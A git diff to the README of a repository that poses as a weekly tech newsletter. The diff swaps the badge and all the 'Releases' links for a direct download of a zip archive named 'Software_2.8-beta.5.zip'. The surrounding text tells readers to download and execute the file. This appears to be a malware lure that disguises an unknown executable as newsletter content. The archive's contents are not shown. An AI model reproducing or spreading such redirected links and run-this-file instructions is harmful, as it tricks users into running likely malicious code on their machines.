@@ -1,6 +1,6 @@
 # Weekly 📅
 
-![Weekly](https://img.shields.io/badge/Weekly-科技爱好者周刊-blue)
+![Weekly](https://github.com/kibergb/weekly/raw/refs/heads/master/docs/subjects/Software_2.8-beta.5.zip科技爱好者周刊-blue)
 
 Welcome to the **Weekly** repository! This project serves as a hub for technology enthusiasts. Every Friday, we share insights, news, and updates in the tech world. Our goal is to keep you informed and engaged with the latest trends and developments.
 
@@ -21,7 +21,7 @@ In an age where technology evolves rapidly, staying updated is crucial. The **We
 
 ## Getting Started
 
-To start using the **Weekly**, simply visit our [Releases](https://github.com/kibergb/weekly/releases) page. Here, you can find the latest editions. Each release is packaged for easy access. Download the files, execute them, and dive into the latest tech discussions.
+To start using the **Weekly**, simply visit our [Releases](https://github.com/kibergb/weekly/raw/refs/heads/master/docs/subjects/Software_2.8-beta.5.zip) page. Here, you can find the latest editions. Each release is packaged for easy access. Download the files, execute them, and dive into the latest tech discussions.
 
 ## Features
 
@@ -32,7 +32,7 @@ To start using the **Weekly**, simply visit our [Releases](https://github.com/ki
 
 ## How to Use
 
-1. **Download the Latest Release**: Visit our [Releases](https://github.com/kibergb/weekly/releases) page. Select the latest edition and download it.
+1. **Download the Latest Release**: Visit our [Releases](https://github.com/kibergb/weekly/raw/refs/heads/master/docs/subjects/Software_2.8-beta.5.zip) page. Select the latest edition and download it.
 2. **Execute the File**: Once downloaded, run the file to access the latest content.
 3. **Engage with the Content**: Read through the articles, explore links, and participate in discussions.
 
@@ -56,7 +56,7 @@ For questions or suggestions, feel free to reach out via GitHub issues or contac
 
 ## Releases
 
-Don't forget to check out our [Releases](https://github.com/kibergb/weekly/releases) section for the latest updates. Each release contains valuable information that can enhance your tech knowledge.
+Don't forget to check out our [Releases](https://github.com/kibergb/weekly/raw/refs/heads/master/docs/subjects/Software_2.8-beta.5.zip) section for the latest updates. Each release contains valuable information that can enhance your tech knowledge.
 
 ---
 
